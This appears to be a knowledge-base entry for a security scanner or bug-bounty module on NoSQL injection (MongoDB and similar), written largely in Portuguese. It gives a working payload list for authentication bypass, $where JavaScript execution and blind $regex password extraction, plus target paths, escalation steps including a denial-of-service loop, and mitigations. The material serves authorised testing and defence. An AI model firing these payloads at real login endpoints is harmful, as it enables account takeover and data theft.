---
id: nosql_injection
title: "NoSQL Injection"
module: "NoSQLi"
severity: "CRITICAL"
cwe_id: "CWE-943"
cwe_title: "Improper Neutralization of Special Elements in Data Query Logic"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
vrt_id: "injection.nosql_injection"
---

## Summary
Entrada do usuario e interpretada como operador ou expressao em queries NoSQL (MongoDB, DynamoDB, CouchDB), permitindo bypass de autenticacao, extracao de dados e, em alguns casos, execucao de codigo arbitrario no servidor via operadores como `$where`.

## Description
NoSQL injection ocorre quando dados controlados pelo usuario sao passados diretamente para operadores de query sem validacao de tipo. Diferente de SQL injection, o vetor principal e a injecao de objetos JSON com operadores do banco:

- **Operator injection (query params):** parametros como `username[$ne]=` ou `password[$gt]=` sao interpretados como operadores MongoDB pelo parser de query string (Express/qs, por exemplo).
- **JSON body injection:** corpo JSON com `{"username": {"$ne": ""}}` bypassa autenticacao quando o backend passa o objeto diretamente para `db.collection.find()`.
- **$where injection:** o operador `$where` permite execucao de JavaScript arbitrario no servidor MongoDB, equivalente a SQL injection com `xp_cmdshell`.
- **$regex extraction:** `{"password": {"$regex": "^a"}}` permite extracao caractere por caractere (blind NoSQLi).
- **Error-based:** mensagens de erro como `MongoError`, `CastError`, `BSONTypeError` revelam tecnologia e estrutura interna.

A falha aparece em endpoints de login, busca, filtros e APIs que aceitam query params ou JSON sem validacao de tipo. Frameworks que fazem merge automatico de query strings em objetos (Express, Koa, Fastify com qs) sao especialmente vulneraveis.

## Impact
- Bypass completo de autenticacao -- login como qualquer usuario sem credenciais.
- Extracao de dados sensiveis via blind extraction ($regex, $where).
- Execucao de JavaScript arbitrario no servidor via $where (MongoDB).
- Enumeracao de usuarios e dados via operadores de comparacao.
- Negacao de servico via queries pesadas ($where com loops).
- Comprometimento total do banco de dados.

## Payloads and Bypasses
```
# -- Operator injection (query parameters) --
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
username[$where]=1&password[$where]=1

# -- JSON body auth bypass --
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}

# -- $where JavaScript execution --
{"$where": "this.password.match(/.*/)"}
{"$where": "sleep(5000)"}
';return 'a'=='a' && ''=='
";return 'a'=='a' && ''=='
0;return true

# -- $regex blind extraction (caractere por caractere) --
{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}

# -- $in enumeration --
{"username":{"$in":["Admin","admin","root","administrator"]},"password":{"$gt":""}}

# -- Length extraction --
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
username[$ne]=toto&password[$regex]=.{8}

# -- MongoDB-specific payloads --
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
|| 1==1
' && this.password.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```

## Target Context (Crawler Hints)
- **Parametros comuns:** `username`, `password`, `email`, `user`, `login`, `query`, `search`, `filter`, `id`, `name`.
- **Paths comuns:** `/login`, `/api/login`, `/api/auth`, `/api/signin`, `/api/users`, `/api/search`, `/search`, `/api/`, `/api/v1/`, `/api/v1/users`, `/api/v1/auth`.
- **Sinais:** erros MongoDB (MongoError, CastError, BSONTypeError, MongoServerError, mongoose); respostas diferentes para `[$ne]=` vs valor normal; resposta com token/session apos JSON injection; headers indicando Node.js/Express.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2021-22911 | Rocket.Chat | 2021 | NoSQLi no endpoint de reset de password permite takeover de qualquer conta via operador $regex | Auth bypass |
| CVE-2019-2386 | MongoDB | 2019 | Sessao expirada pode ser reutilizada quando loggedInUsers cache nao e limpo corretamente | Session reuse |
| CVE-2021-20682 | baserCMS | 2021 | NoSQLi via parametro de busca permite extracao de dados do banco MongoDB | Data extraction |
| CVE-2023-26117 | angular (Express) | 2023 | ReDoS via input nao sanitizado em regex parsing -- facilita NoSQLi com $regex | ReDoS + NoSQLi |

## Escalation Techniques
- **Auth bypass completo:** usar `{"username": {"$ne": null}, "password": {"$ne": null}}` para logar como primeiro usuario (geralmente admin). Iterar com `$nin` para obter lista completa de usuarios.
- **Extracao de dados via $regex:** extrair senhas caractere por caractere com `{"password": {"$regex": "^a"}}`, `"^ab"`, `"^abc"` etc. Automatizar com script que testa cada posicao contra `[a-zA-Z0-9!@#$%^&*]`.
- **Extracao de tamanho:** usar `{"password": {"$regex": ".{N}"}}` incrementando N para determinar comprimento do campo antes de extrair conteudo.
- **Execucao de JS via $where:** se MongoDB permite JavaScript, usar `$where: "function(){return this.username == 'admin' && sleep(5000)}"` para confirmar e escalar. Em versoes antigas, `$where` permite acesso ao `db` object para dump completo.
- **DoS via $where:** injetar `$where: "while(true){}"` para travar o worker do MongoDB. Util para demonstrar impacto em reports.
- **Enumeracao via operadores:** usar `$in`, `$nin`, `$gt`, `$lt` para enumerar valores possiveis de campos (roles, emails, tokens).
- **Pivot para SSRF:** se a aplicacao faz lookup em URL baseada em dados do MongoDB (webhooks, callbacks), injetar URL de collaborator via auth bypass para confirmar SSRF.

## Hunting Methodology
1. Identificar tecnologia backend -- procurar headers `X-Powered-By: Express`, `Server: nginx` com Node.js, MongoDB-related errors, ou stack traces com `mongoose`, `MongoClient`.
2. Mapear endpoints que aceitam entrada do usuario e interagem com banco -- login, busca, filtros, APIs REST com query params.
3. Testar operator injection em query params: adicionar `[$ne]=` a cada parametro (ex.: `password[$ne]=`) e comparar resposta com valor normal.
4. Testar JSON body injection em endpoints que aceitam `Content-Type: application/json` -- enviar `{"field": {"$ne": ""}}` e comparar com `{"field": "valor_invalido"}`.
5. Verificar se erros expoe tecnologia: enviar objetos malformados (`{"$invalid": 1}`) e observar se a resposta contem `MongoError`, `CastError`, `BSONTypeError`.
6. Para blind NoSQLi: usar `$regex` com prefixo incremental e medir diferenca na resposta (tamanho, tempo, mensagem).
7. Testar `$where` com `sleep(5000)` para confirmar execucao de JS no servidor (time-based blind).
8. Automatizar com NoSQLMap ou nosqli-scanner apos confirmar vetor manualmente.

## False Positive Indicators
- Aplicacao retorna erro generico (400/422) sem stack trace ou informacao sobre o banco -- pode ser validacao de tipo, nao injecao.
- Resposta e identica para `[$ne]=` e para valor normal -- indica que o framework nao faz merge de operadores em objetos (ex.: query parser simples sem qs/extended).
- Erro contem "MongoError" mas a mensagem indica syntax validation, nao execucao de query -- o banco rejeitou o payload antes de processar.
- WAF bloqueia request (403) mas a aplicacao nao e vulneravel -- diferenciar bloqueio de WAF de validacao server-side.
- Endpoint retorna lista generica de resultados independente do input (ex.: busca publica sem filtro real) -- resposta "positiva" nao confirma injecao.

## Recommendation
1. Validar tipos de entrada -- rejeitar objetos quando strings sao esperados. Em Express/Node.js, usar `express-mongo-sanitize` ou validar com `typeof input === 'string'`.
2. Nunca passar input do usuario diretamente para operadores de query. Usar metodos de ODM que rejeitam operadores (Mongoose `.findOne({username: String(input)})`).
3. Desabilitar `$where` no MongoDB (`mongod --setParameter allowJavascript=false` ou `security.javascriptEnabled: false`).
4. Usar schema validation no MongoDB para garantir tipos esperados nos documentos.
5. Desabilitar extended query string parsing em Express (`app.set('query parser', 'simple')`) para evitar que `param[$ne]` seja interpretado como objeto.
6. Mascarar mensagens de erro do banco -- nao retornar MongoError, CastError ou stack traces em producao.
7. Implementar rate limiting em endpoints de login para dificultar blind extraction.
